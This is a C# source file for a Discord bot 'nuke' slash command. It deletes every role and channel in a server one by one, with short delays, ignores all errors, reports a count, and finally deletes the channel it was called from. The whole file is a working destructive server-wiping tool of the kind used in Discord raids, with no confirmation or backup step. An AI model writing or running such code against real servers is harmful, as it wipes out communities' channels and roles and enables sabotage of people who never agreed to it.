using Discord;
using Discord.Interactions;
using Discord.WebSocket;
using System;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace amblflecasm.Data.Commands
{
	public class nuke : InteractionModuleBase<SocketInteractionContext>
	{
		[RequireLeme]
		[SlashCommand("nuke", "What server?", false, RunMode.Async)]
		public async Task Nuke()
		{
			IReadOnlyCollection<SocketRole> roles = this.Context.Guild.Roles;
			IReadOnlyCollection<SocketGuildChannel> channels = this.Context.Guild.Channels;

			EmbedBuilder embedBuilder = new EmbedBuilder()
				.WithTitle("Working")
				.WithDescription(string.Format("Nuking {0} {1} and {2} {3}", roles.Count, Program.AutoPlural("role", roles.Count), channels.Count, Program.AutoPlural("channel", channels.Count)))
				.WithColor(Color.Red);

			int nukedRoles = 0;
			foreach (SocketRole role in roles)
			{
				try
				{
					await role.DeleteAsync();
					nukedRoles++;
				}
				catch (Exception) { }

				await Task.Delay(250);
			}

			int nukedChannels = 0;
			foreach (SocketGuildChannel channel in channels)
			{
				if (channel.Id == this.Context.Channel.Id) continue; // Don't kill this channel right away so we can display our success message

				try
				{
					await channel.DeleteAsync();
					nukedChannels++;
				}
				catch (Exception) { }

				await Task.Delay(250);
			}

			embedBuilder.Title = "Finished";

			if (nukedRoles > 0 && nukedChannels > 0)
				embedBuilder.Color = Color.Green; // Full success
			else if (nukedRoles == 0 && nukedChannels == 0)
				embedBuilder.Color = Color.Red; // Epic fail
			else
				embedBuilder.Color = Color.Orange; // Semi success

			embedBuilder.Description = string.Format("Nuked {0} {1} and {2} {3}", nukedRoles, Program.AutoPlural("role", nukedRoles), nukedChannels, Program.AutoPlural("channel", nukedChannels));

			await this.ModifyOriginalResponseAsync(message => message.Embed = embedBuilder.Build());
			await Task.Delay(1000); // Wait a bit before destroying this channel to give them time to read

			try
			{
				await (this.Context.Channel as SocketGuildChannel).DeleteAsync();
			}
			catch (Exception) { }
		}
	}
}
